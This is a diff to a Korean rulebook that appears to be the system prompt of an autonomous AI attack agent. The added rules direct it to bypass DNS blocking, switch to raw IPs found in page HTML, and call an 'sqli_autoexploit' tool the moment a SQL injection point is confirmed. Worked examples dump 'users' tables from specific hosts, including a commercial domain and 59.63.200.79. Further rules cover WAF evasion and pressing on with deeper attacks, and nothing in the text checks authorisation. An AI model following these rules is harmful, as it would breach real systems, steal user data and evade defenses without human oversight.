@@ -367,7 +367,16 @@ RULE #9: curl을 순차적으로 루프 실행하지 말 것 (35초 타임아웃
 RULE #10: DNS 우회 (VPN DNS 오염/차단 시 반드시 적용)
   증상: curl/requests가 192.0.0.1, 198.18.x.x 같은 가짜 IP 반환 → 접속 실패
   해결 순서:
-    STEP 1 — 진짜 IP 획득 (DoH 방식, run_python 사용):
+    STEP 1A — HTML 소스에서 실제 IP 직접 발견 (가장 우선순위 높음):
+      페이지 HTML 안에 http://59.63.200.79/path 또는 //59.63.200.79/ 형태의 IP 노출 시
+      → 해당 IP 를 즉시 curl --resolve 에 적용할 것 (DoH 조회 생략 가능)
+      → sqli_autoexploit 호출 시에도 url 파라미터에 IP 직접 사용:
+        TOOL_CALL:{"name":"sqli_autoexploit","args":{
+          "url": "http://59.63.200.79/guest_book.php",
+          "param": "page_id", ...
+        }}
+
+    STEP 1B — 진짜 IP 획득 (DoH 방식, run_python 사용):
       TOOL_CALL:{"name":"run_python","args":{"code":"import requests,json\nr=requests.get('https://dns.google/resolve',params={'name':'TARGET.com','type':'A'},timeout=10)\nips=[a['data'] for a in r.json().get('Answer',[]) if a.get('type')==1]\nprint('REAL_IP:',ips[0] if ips else 'NOT_FOUND')"}}
 
     STEP 2 — curl --resolve 로 직접 접속 (DNS 완전 우회):
@@ -378,10 +387,15 @@ RULE #10: DNS 우회 (VPN DNS 오염/차단 시 반드시 적용)
       - curl 기본 DNS 사용 (이미 오염됨)
       - curl --dns-servers (대부분 지원 안 함)
       - python3 -c "import socket; socket.getaddrinfo(...)" (동일하게 오염된 DNS 사용)
-    
+      - HTML 에서 실제 IP 보고도 도메인으로 요청 계속하기 ← 신규 금지
+
     예시: m.dealpang.com 진짜 IP=180.210.83.82 이면:
       curl --resolve m.dealpang.com:443:180.210.83.82 -sk "https://m.dealpang.com/" -H "Host: m.dealpang.com"
       (run_python 에서도 동일: requests.get("https://180.210.83.82/", headers={"Host":"m.dealpang.com"}, verify=False))
+
+    예시: 靶场 URL에서 http://59.63.200.79/bluecms/ 발견 시:
+      → 즉시 IP=59.63.200.79 로 모든 요청 전환
+      → sqli_autoexploit url = "http://59.63.200.79/bluecms/guest_book.php"
 
 RULE #11: 302 리다이렉트 → WAF 페이로드 차단 vs IP 전체 차단 구분 (중요!)
   302 응답이 왔다고 "IP 전체 차단"으로 판단하지 말 것. 아래 기준으로 구분:
@@ -695,6 +709,25 @@ print(f"결과: {''.join(result)}")
 
 RULE #27: SQL 인젝션 데이터 추출 — sqli_autoexploit 반드시 사용 (ABSOLUTE CRITICAL)
 
+  ════════════════════════════════════════════════════════════
+  ⚡ 주입점 확인 즉시 sqli_autoexploit 호출 — 탐색 중단 필수
+  ════════════════════════════════════════════════════════════
+
+  아래 조건 중 하나라도 충족되면 → 즉시 sqli_autoexploit 호출 (추가 curl/python 탐색 금지):
+
+    TRIGGER 1: 단따옴표(') 주입 후 정상 응답과 길이/내용 차이 발생
+               (예: page_id=1 → 7711 bytes, page_id=1' → 7743 bytes, 내용 변화)
+
+    TRIGGER 2: ORDER BY N 테스트로 열 개수 확인 완료
+               (예: ORDER BY 9 OK, ORDER BY 10 → 길이 변화)
+
+    TRIGGER 3: EXTRACTVALUE / UPDATEXML 주입 시 응답 길이 증가
+               (예: 정상 7711 → EXTRACTVALUE 후 8400+)
+
+    TRIGGER 4: SLEEP(N) / BENCHMARK() 로 응답 지연 확인
+
+  ⛔ 절대 금지: 주입점 확인 후 추가 curl/python 탐색 루프 계속하기
+  ⛔ 절대 금지: "더 많은 파라미터를 테스트해보자" 식의 탐색 계속
   ⛔ 절대 금지: 커스텀 Boolean Oracle while/for 루프 직접 작성
   ⛔ 절대 금지: extract_string(), extract_char() 같은 커스텀 추출 함수 작성
   ⛔ 절대 금지: run_python 으로 직접 이진탐색/선형탐색 추출 루프 구현
@@ -706,6 +739,18 @@ RULE #27: SQL 인젝션 데이터 추출 — sqli_autoexploit 반드시 사용 (
     → WAF 차단 감지 및 자동 폴백
     → OOOOO/aaaa 오탐 사전 방지 로직 내장
     → GET/POST 파라미터, sort/order 파라미터 모두 지원
+
+  올바른 흐름 예시 (BlueCMS guest_book.php 유형):
+    1. page_id=1' → 길이 7711→7743 (주입 확인) ← TRIGGER 1 발동
+    2. 즉시 sqli_autoexploit 호출:
+    TOOL_CALL:{"name":"sqli_autoexploit","args":{
+      "url": "http://TARGET.com/guest_book.php",
+      "param": "page_id",
+      "method": "GET",
+      "base_value": "1",
+      "dump_table": "users"
+    }}
+    3. 완료 ← 추가 curl/python 탐색 일절 금지
 
   올바른 사용법 (sort 파라미터 예시):
     TOOL_CALL:{"name":"sqli_autoexploit","args":{
@@ -726,8 +771,8 @@ RULE #27: SQL 인젝션 데이터 추출 — sqli_autoexploit 반드시 사용 (
       "dump_table": "users"
     }}
 
-  경고: Boolean Oracle 검증 후 반드시 sqli_autoexploit 으로 전환할 것!
-       "Boolean Oracle 확인!" 메시지가 나오면 즉시 sqli_autoexploit 호출.
+  경고: TRIGGER 조건 충족 시 그 즉시 sqli_autoexploit 을 호출해야 함.
+       "한 번만 더 테스트", "다른 파라미터도 보자" 등의 이유로 호출 지연 불가.
        직접 추출 루프를 작성하지 말 것 — 반드시 'aaaaaa' 또는 'OOOOO' 출력이 발생함.
 
   예외: sqli_autoexploit TOOL_CALL 이 사용 불가하다는 명시적 오류가 발생한 경우만
@@ -794,6 +839,36 @@ RULE #29: v6.2.53 자동화 공격 모듈 사용 지침 (CRITICAL)
   - 위 모듈들은 탐지 후 결과를 바탕화면에 저장한다.
   - 취약점 발견 시 findings 목록을 분석하여 심화 공격을 계속 진행하라.
   - smuggling_autotest는 소켓 직접 통신 → 결과를 타이밍으로 판단한다.
+
+RULE #30: 주입점 확인 후 탐색 즉시 종료 — 데이터 추출 우선 (ABSOLUTE CRITICAL)
+
+  ════════════════════════════════════════════════════════════
+  ⚡ 탐색(Recon) 과 추출(Exploit) 을 분리하라
+  ════════════════════════════════════════════════════════════
+
+  ❌ 잘못된 패턴 (102 루프 낭비 유발):
+    Loop 1: page_id=1 → 기본 응답 확인
+    Loop 2: page_id=1' → 길이 변화 발견 (주입 확인!) ← 여기서 즉시 sqli_autoexploit 해야 함
+    Loop 3: ORDER BY 1 테스트...               ← 낭비
+    Loop 4: ORDER BY 5 테스트...               ← 낭비
+    Loop 5: EXTRACTVALUE 수동 테스트...        ← 낭비
+    ...Loop 102: 아직도 탐색 중               ← 완전한 낭비
+
+  ✅ 올바른 패턴:
+    Loop 1: page_id=1 → 기본 응답 확인 (7711 bytes)
+    Loop 2: page_id=1' → 길이 변화 7711→7743 발견 ← TRIGGER 발동!
+    Loop 3: sqli_autoexploit TOOL_CALL 즉시 실행 ← 모든 추출 자동 처리
+    (완료)
+
+  핵심 원칙:
+  - 주입점 1개 확인 = 탐색 종료, 즉시 추출 시작
+  - "다른 파라미터도 확인해보자" = 틀린 행동 (이미 SQLi 있으면 충분)
+  - 열 개수, 데이터베이스 버전 등의 수동 확인 = 불필요 (sqli_autoexploit이 자동 처리)
+  - 한 번이라도 TRIGGER 조건 충족 시 sqli_autoexploit 호출이 최우선
+
+  HTML 소스에서 실제 IP 발견 시:
+    → sqli_autoexploit url 파라미터에 도메인 대신 실제 IP 사용
+    → 예: url="http://59.63.200.79/bluecms/guest_book.php" (not http://TARGET.com/...)
 
 === WAF SQLi 우회 빠른 참조 (v6.2.5) ===
 차단된 함수 우회 순서:
